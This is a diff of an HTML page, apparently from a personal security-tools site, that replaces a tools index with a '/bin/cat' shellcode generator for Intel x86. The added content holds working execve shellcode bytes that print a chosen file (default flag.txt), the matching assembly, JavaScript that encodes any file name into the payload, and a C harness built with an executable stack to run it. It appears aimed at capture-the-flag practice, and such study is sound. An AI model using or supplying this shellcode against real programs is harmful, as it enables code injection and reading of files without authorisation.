@@ -4,7 +4,7 @@
          
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>Tools</title>
+        <title>/bin/cat Shellcode generator</title>
         
         <style>
 
@@ -61,9 +61,6 @@
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
  <meta name="generator" content="Hugo 0.58.3" />
         
-        <link href="/tools/index.xml" rel="alternate" type="application/rss&#43;xml" title="Master 0xCcC" />
-        <link href="/tools/index.xml" rel="feed" type="application/rss&#43;xml" title="Master 0xCcC" />
-        
 
         
     </head>
@@ -83,7 +80,7 @@
 
                 <div class="navbar-header">
 
-                    <a class="navbar-brand visible-xs" href="#">Tools</a>
+                    <a class="navbar-brand visible-xs" href="#">/bin/cat Shellcode generator</a>
 
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
@@ -128,9 +125,7 @@
 
 <main>
 
-    <h2>Tools</h2>
-
-     <div class="item">
+    <div class="item">
 
     
     
@@ -148,29 +143,160 @@
     
 
 </div>
-  <div class="item">
-
-    
-    
-    
-
-    
-    
-
-    <div>
-        <a class="itemtitle" href="/tools/convert/">Bin/asci/hex/b64 converter</a>
-        <span class="itemdate">July 27, 2019</span>
-    </div>
 
 
-    
+    <br> <div class="text-justify"> 
 
+<h2>/bin/cat [yourfile] Shellcode generator for intel x86</h2>
+<br>
+File name to read : <input id="txt_file" type="text" name="filename" value="flag.txt"/>
+<button id="btn_generate"/>Generate</button>
+<br><br>
+This is your shellcode : <br>
+
+<div id="shellcode">\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80</div>
+<br>
+<div id="warning" style="color:red"></div>
+<div id="result"></div>
+
+<pre>
+bits 32
+global main
+
+SECTION .text
+
+main:
+xor    eax,eax
+push   eax ; env<br>
+push   0x7461632f ;"tac/"
+push   0x6e69622f ;"inb/"
+mov    ebx,esp
+push   eax
+</pre>
+<pre id="opcode">
+push   0x7478742e
+push   0x67616c66
+</pre>
+<pre>
+mov    ecx,esp
+push   eax
+push   ecx
+push   ebx
+mov    ecx,esp
+xor eax,eax
+add eax,0xb
+int 0x80
+</pre>
+
+
+
+
+
+<script>
+
+   var begin = "\\x31\\xc0\\x50\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50" ;
+   var end = "\\x89\\xe1\\x50\\x51\\x53\\x89\\xe1\\x31\\xc0\\x83\\xc0\\x0b\\xcd\\x80";
+   var beg_op = ""
+
+   var shelldiv = document.getElementById("shellcode");
+
+   document.getElementById("btn_generate").onclick = function(){
+
+      var filename = document.getElementById("txt_file").value ;
+      
+      if(filename.length < 1 ){
+         alert("empty file name !");
+         return;
+      }
+      
+      document.getElementById('warning').innerHTML = "";
+      document.getElementById('opcode').innerHTML= ""
+      shelldiv.innerHTML = "";
+      shelldiv.innerHTML += begin ;
+
+      nbblocks = Math.trunc(filename.length / 4) ;
+      if( filename.length % 4 > 0) nbblocks++;
+
+      var count = 0 ;
+      var zero = false ;
+      lines = [] ;
+      
+
+      while(nbblocks > 0){
+
+         var line = ""
+         opcode = "";
+         for(i=0;i<4;i++){
+            if(count>filename.length-1){
+               line += "\\x00";
+               opcode = "00" + opcode ;
+               zero = true;
+            }
+            else {
+               //console.log("add: " + filename.charCodeAt(count).toString(16) + "("+filename[count]+")" + "count = " + count);
+               line += "\\x" + filename.charCodeAt(count).toString(16);
+               opcode = filename.charCodeAt(count).toString(16) +  opcode ;
+            }
+            count ++;
+         }
+
+         lines.push("\\x68" + line);
+         document.getElementById('opcode').innerHTML += "push 0x" +opcode+"<br>";
+         nbblocks--;
+      }
+      if(zero) document.getElementById('warning').innerHTML = "/!\\ Some \\00 are present, you may need polymorphism. (See Memo->Write your shellcode)" ;
+      shelldiv.innerHTML +=  lines.reverse().join('');
+
+      document.getElementById('opcode')
+      shelldiv.innerHTML += end ;
+   };
+
+
+</script>
+
+
+Note for myself : 
+
+".txt" = 0x7478742e (reverse) but opcode are in "normal" order : 2e 74 78 74 </h5>
+
+<h3>Test the shellcode (Assembly)</h3>
+
+Paste the above opcodes into "cat.asm"
+<pre>
+$ echo "Content of file" >> flag.txt
+$ nasm -felf32 -o cat.o cat.asm 
+$ gcc -o cat cat.o -m32
+$ ./cat
+Content of file
+</pre>
+
+<h3>Test the shellcode (C)</h3>
+
+<pre>
+#include <stdio.h>
+#include <string.h>
+
+/* shellcode goes here : */
+char code[] = "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80";
+
+int main()
+{
+    (*(void(*)()) code)();
+    return 0;
+}
+</pre>
+Compile with :
+<pre>gcc -o shelltest shelltest.c -z execstack -m32</pre>
 </div>
- 
+
+    
+    
+
+    
+
+    
 
 </main>
-
-
 
         <footer>
 
